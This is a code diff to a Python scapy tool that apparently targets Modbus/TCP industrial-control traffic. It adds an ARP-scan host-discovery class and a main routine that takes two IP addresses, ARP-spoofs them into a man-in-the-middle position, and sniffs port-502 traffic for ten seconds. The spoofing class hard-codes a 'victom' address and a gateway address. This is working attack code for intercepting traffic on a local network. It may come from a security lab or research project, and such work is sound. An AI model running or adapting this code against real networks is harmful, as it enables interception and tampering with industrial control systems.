@@ -1,3 +1,4 @@
+import subprocess
 import time
 import scapy.all as scapy 
 import threading
@@ -139,7 +140,7 @@ class mb:
 
 
 
-    def print_scannable(pkt, show_transId = False, show_x = True, show_y = True, show_theta = True, show_speed = True, show_rudder = True, convert = False, print = True):
+    def print_scannable(pkt, show_transId = False, show_x = True, show_y = True, show_theta = True, show_speed = True, show_rudder = True, convert = False, print_to_console = True):
 
         if not (mb.is_commands(pkt) or mb.is_coord(pkt)):
             return
@@ -208,7 +209,7 @@ class mb:
                     out += f"{r:>6}"
             else:
                 out += " "*6
-        if print:
+        if print_to_console:
             print(out)
         else:
             return out
@@ -291,7 +292,7 @@ class buffer:
             self.timestamp = time.time()
             self.length = len(pkt[TCP].payload)
             self.info = pkt.summary()
-            self.scannable = mb.print_scannable(pkt, print=False, convert=True)
+            self.scannable = mb.print_scannable(pkt, print_to_console=False, convert=True)
 
 
     def put(pkt, version):
@@ -422,13 +423,15 @@ class net_filter_queue:
 class scapy_sniffing:
     sniffer = None
         
-    def start():
+    def start(print_console = False, put_buffer = True):
         def handle_packet(pkt):
             # Modbus/TCP runs over TCP port 502
             if pkt.haslayer(TCP) and (pkt[TCP].sport == 502 or pkt[TCP].dport == 502):
                 if mb.is_modbus(pkt):
-                    # mb.print_scannable(pkt, convert=True)
-                    buffer.put(pkt, "Real")
+                    if print_console:
+                        mb.print_scannable(pkt, convert=True)
+                    if put_buffer:
+                        buffer.put(pkt, "Real")
 
         scapy_sniffing.sniffer = scapy.AsyncSniffer(
             filter="tcp port 502",
@@ -489,9 +492,10 @@ class arp_spoofing:
 
 
 
-    def start():
+    def start(target = '192.168.8.137', host = '192.168.8.243', silence = True):
         # Stop printing so much
-        conf.verb = 0
+        if silence:
+            conf.verb = 0
         
         arp_spoofing.running = True
 
@@ -499,13 +503,13 @@ class arp_spoofing:
         arp_spoofing.saved_packets = []
         
         #victom ip address
-        arp_spoofing.target = '192.168.8.137'
+        arp_spoofing.target = target
 
         #gateway ip
-        arp_spoofing.host = '192.168.8.243'
+        arp_spoofing.host = host
 
         # True = print, False = no print
-        arp_spoofing.verbose = False
+        arp_spoofing.verbose = not silence
 
         def interval():
             if arp_spoofing.running:
@@ -532,3 +536,59 @@ class arp_spoofing:
         arp_spoofing.restore(arp_spoofing.host, arp_spoofing.target)
 
         print("Stopped ARP Spoof")
+
+# Handles nmapping. get hosts
+class nmapping:
+    def arp_scan(network, iface="wlp0s20f3"):
+        packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=network)
+        answered, _ = scapy.srp(packet, timeout=2, verbose=False)
+
+        hosts = []
+        for _, recv in answered:
+            hosts.append({
+                "ip": recv.psrc,
+                "mac": recv.hwsrc
+            })
+        return hosts
+
+    def print_hosts(current_address):
+        hosts = nmapping.arp_scan(current_address)
+        for h in hosts:
+            print(h)
+    
+    def get_host_ips(current_address):
+        hosts = nmapping.arp_scan(current_address)
+        out = []
+        for h in hosts:
+            out.append(h["ip"])
+        return out
+
+    def get_current_ip():
+        out = subprocess.check_output(["ip", "-4", "addr", "show"], text=True)
+        return out
+
+if __name__ == "__main__":
+
+    print(nmapping.get_current_ip())
+
+    current_ip = input("enter current ip\n\n")
+
+    ips = nmapping.get_host_ips(current_ip)
+    
+    print(ips)
+
+    ip1 = input("Enter ip 1\n\n")
+    ip2 = input("Enter ip 2\n\n")
+
+    arp_spoofing.start(ip1, ip2, silence=True)
+
+    input("Press Enter to continue\n\n")
+
+    scapy_sniffing.start(print_console=True, put_buffer=False)
+
+    time.sleep(10)
+
+    scapy_sniffing.stop()
+    arp_spoofing.stop()
+
+    
